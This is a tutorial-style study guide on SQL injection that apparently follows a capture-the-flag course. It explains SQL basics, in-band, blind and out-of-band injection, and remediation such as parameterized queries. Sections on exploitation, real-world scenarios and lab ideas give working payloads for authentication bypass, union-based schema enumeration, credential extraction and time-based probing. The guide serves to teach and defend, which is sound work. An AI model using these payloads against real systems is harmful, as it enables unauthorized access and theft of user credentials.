# SQL Injection

---

## Table of Contents

1. **Introduction to SQL & Basic Queries**
   1.1 What is SQL?
   1.2 Basic SQL Syntax (SELECT, INSERT, UPDATE, DELETE)
2. **What is SQL Injection?**
3. **Types of SQL Injection**
   3.1 In-Band SQL Injection
   3.2 Blind SQL Injection (Boolean & Time-Based)
   3.3 Out-of-Band SQL Injection
4. **Practical Exploitation of SQL Injection**
   4.1 Error-Based SQL Injection
   4.2 Union-Based SQL Injection
   4.3 Boolean-Based SQL Injection
   4.4 Time-Based SQL Injection
5. **Real-World Scenarios**
   5.1 Authentication Bypass
   5.2 Database Enumeration (Tables, Columns, Data)
6. **Remediation Techniques**
   6.1 Prepared Statements / Parameterized Queries
   6.2 Input Validation / Sanitization
   6.3 Escaping Special Characters
   6.4 Principle of Least Privilege
7. **Hands-On Examples / Lab Ideas**
8. **Conclusion & Further Reading**

---

## 1. Introduction to SQL & Basic Queries

### 1.1 What is SQL?
**SQL (Structured Query Language)** is the standard language used to communicate with relational database management systems (RDBMS). Examples of RDBMS that use SQL include MySQL, PostgreSQL, Microsoft SQL Server, and Oracle. SQL is used to insert, query, update, and delete data in a database.

### 1.2 Basic SQL Syntax
Below are some fundamental SQL statements.

1. **SELECT**: Retrieve data from a table.
   ```sql
   SELECT * FROM users;
   SELECT username, password FROM users;
   SELECT * FROM users WHERE username = 'admin';
   ```

2. **INSERT**: Insert new data/rows into a table.
   ```sql
   INSERT INTO users (username, password)
   VALUES ('bob', 'password123');
   ```

3. **UPDATE**: Update existing data in a table.
   ```sql
   UPDATE users
   SET username = 'root', password = 'pass123'
   WHERE username = 'admin';
   ```

4. **DELETE**: Remove rows from a table.
   ```sql
   DELETE FROM users WHERE username = 'martin';
   DELETE FROM users; -- deletes all data in the table
   ```

5. **UNION**: Combine results from multiple SELECT statements.
   ```sql
   SELECT name, address, city, postcode FROM customers
   UNION
   SELECT company, address, city, postcode FROM suppliers;
   ```

These statements form the foundation of SQL operations that, when combined with unvalidated user input, can lead to SQL Injection.

---

## 2. What is SQL Injection?

**SQL Injection** occurs when an application incorporates **untrusted user input** into the structure of a SQL query, allowing an attacker to change how the query is executed. By manipulating query parameters (e.g., URL parameters, form fields), an attacker may access or modify data they are not supposed to, or even bypass security checks altogether.

### Example Scenario
A URL might look like:
```
https://website.thm/blog?id=1
```
The application builds a query like:
```sql
SELECT * FROM blog WHERE id=1 AND private=0 LIMIT 1;
```
If user input is **not** properly sanitized, the parameter `id=1` can be replaced by something malicious like `id=2;--`, leading to:
```sql
SELECT * FROM blog WHERE id=2;-- AND private=0 LIMIT 1;
```
The `--` begins a comment in SQL, effectively ignoring the remaining part of the query. The attacker thus bypasses the `private=0` check.

---

## 3. Types of SQL Injection

### 3.1 In-Band SQL Injection
- **In-Band** means the attacker uses the **same communication channel** (e.g., the web page or API response) to both launch the attack **and** retrieve the results.
- **Error-Based**: The database error messages appear directly on the page.
- **Union-Based**: Attackers use the `UNION` operator to merge additional SELECT statements and “inject” extra data into the original query’s result.

### 3.2 Blind SQL Injection
- **Blind** means the attacker **cannot** see detailed error messages or direct query output. The application might simply respond with success/failure or true/false indications.
  1. **Boolean-Based**: The attacker alters the query so the application page or API returns a different response (true/false) based on the success of the injected condition.
  2. **Time-Based**: The attacker relies on the database server “pausing” or “sleeping” to indicate a true condition.

### 3.3 Out-of-Band SQL Injection
- **Out-of-Band** injections rely on features like making DNS or HTTP calls from the database to an external server controlled by the attacker.
- This is less common because it requires specific database features (e.g., `xp_dirtree` in MS-SQL or `LOAD_FILE()` in MySQL with remote file access) to be enabled.

---

## 4. Practical Exploitation of SQL Injection

### 4.1 Error-Based SQL Injection
- The attacker tries to **break** the query using special characters (`'`, `"`). If the database reveals an error message (e.g., “Syntax error in SQL statement”), this can confirm a vulnerability.
- Then, the attacker manipulates the query to reveal information about the schema (tables, columns) by leveraging detailed error messages.

**Typical Approach**:
1. Insert `'` or `"` to see if an error occurs.
2. Use database functions like `database()`, `version()`, or `group_concat(...)` to enumerate schema or data.

### 4.2 Union-Based SQL Injection
- The attacker uses `UNION SELECT` statements to **merge** a malicious query with the original query.
- First, they figure out **how many columns** exist in the original query and match that in the `UNION SELECT`.
- Then, they replace some columns with interesting data (e.g., `database()`, or table/column names from `information_schema`).

**Typical Approach**:
1. `... UNION SELECT 1;--` → error (column mismatch).
2. `... UNION SELECT 1,2;--` → error.
3. `... UNION SELECT 1,2,3;--` → success → discovered the query has 3 columns.
4. Use placeholders to reveal data: `0 UNION SELECT 1,2,database()`

### 4.3 Boolean-Based SQL Injection
- The application doesn’t show an error. Instead, the attacker uses conditions to see if the page output changes.
- Example:
  ```sql
  ' OR 1=1;--
  ```
  This can always return true, bypassing authentication.

- For enumeration, the attacker tries:
  ```sql
  ' UNION SELECT 1,2,3 WHERE database() LIKE 'sqli_%';--
  ```
  If the response is different, it confirms a partial guess about the database name.

### 4.4 Time-Based SQL Injection
- The attacker uses **time delays** as the feedback mechanism.
- Example:
  ```sql
  ' UNION SELECT SLEEP(5);--
  ```
- If the server takes 5 seconds to respond, the query was successful. This process is repeated to guess schema data character by character.

---

## 5. Real-World Scenarios

### 5.1 Authentication Bypass
- A login form might perform:
  ```sql
  SELECT * FROM users
  WHERE username='%USERNAME%'
  AND password='%PASSWORD%'
  LIMIT 1;
  ```
- By using `' OR 1=1;--` in the password field, the attacker forces the query to return at least one valid row:
  ```sql
  SELECT * FROM users
  WHERE username=''
  AND password='' OR 1=1;--
  ```
- The application sees a successful match, logging in the attacker (often as the **first** user in the table, e.g., an admin).

### 5.2 Database Enumeration (Tables, Columns, Data)
1. Identify the number of columns (using `UNION SELECT ...`).
2. Enumerate database name with `database()`.
3. Use `information_schema.tables` to list table names:
   ```sql
   UNION SELECT group_concat(table_name)
   FROM information_schema.tables
   WHERE table_schema = 'mydatabase';
   ```
4. Use `information_schema.columns` to list columns:
   ```sql
   UNION SELECT group_concat(column_name)
   FROM information_schema.columns
   WHERE table_name = 'users';
   ```
5. Extract user credentials:
   ```sql
   UNION SELECT group_concat(username, ':', password) FROM users;
   ```

---

## 6. Remediation Techniques

### 6.1 Prepared Statements / Parameterized Queries
- A **prepared statement** separates the SQL logic from the data.
  - In languages like PHP (PDO), Python, or Java, parameterized queries look like:
    ```php
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
    $stmt->execute([$username, $password]);
    ```
  - Here, the SQL syntax is **fixed**, and user input is treated as data, preventing injection.

### 6.2 Input Validation / Sanitization
- **Allow-listing** known good patterns (e.g., numeric-only input for an “id” field).
- Reject or escape dangerous characters (`'`, `"`).
- Ensure user-provided input matches an expected format (e.g., an email address).

### 6.3 Escaping Special Characters
- If parameterized queries are unavailable, carefully escape all special characters with built-in functions.
  - For instance, in PHP `mysqli_real_escape_string()` or `addslashes()` might be used, though this is less robust than prepared statements.

### 6.4 Principle of Least Privilege
- The database user used by the application should only have the **minimal** privileges required (e.g., SELECT privileges on necessary tables, not full root access).
- This limits the damage if an attacker successfully exploits an SQL Injection.

---

## 7. Hands-On Examples / Lab Ideas

1. **Simple Blog App**
   - A parameter `/blog?id=1` that you can manipulate with `' OR 1=1;--`.
   - Attempt union-based injection to list all other blog posts or user credentials.

2. **Login Form**
   - Provide a login form that checks credentials.
   - Attempt `' OR '1'='1` to see if it bypasses authentication.

3. **Blind SQLi Challenge**
   - A minimalistic page that only returns “User exists” or “User doesn’t exist,” or a JSON response (`{"taken": true/false}`).
   - Try enumerating column names with boolean-based queries.

4. **Time-Based**
   - Have a target that only indicates success by a 5-second delay (using MySQL’s `SLEEP()`).
   - Perfect practice for advanced blind injection.

---

## 8. Conclusion & Further Reading

SQL Injection remains one of the most **common** and **critical** vulnerabilities in web applications—often landing near the top of the [OWASP Top 10](https://owasp.org/www-project-top-ten/). It exploits the very way applications communicate with databases, making it exceptionally dangerous.

### Key Takeaways
- **Always sanitize and validate** user inputs—no exceptions.
- Use **parameterized queries** (prepared statements) to separate data from command logic.
- Don’t rely solely on escaping; escaping mistakes can be catastrophic.
- Restrict database privileges to reduce the attack surface if an injection occurs.

### Further Reading
- [OWASP: SQL Injection Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
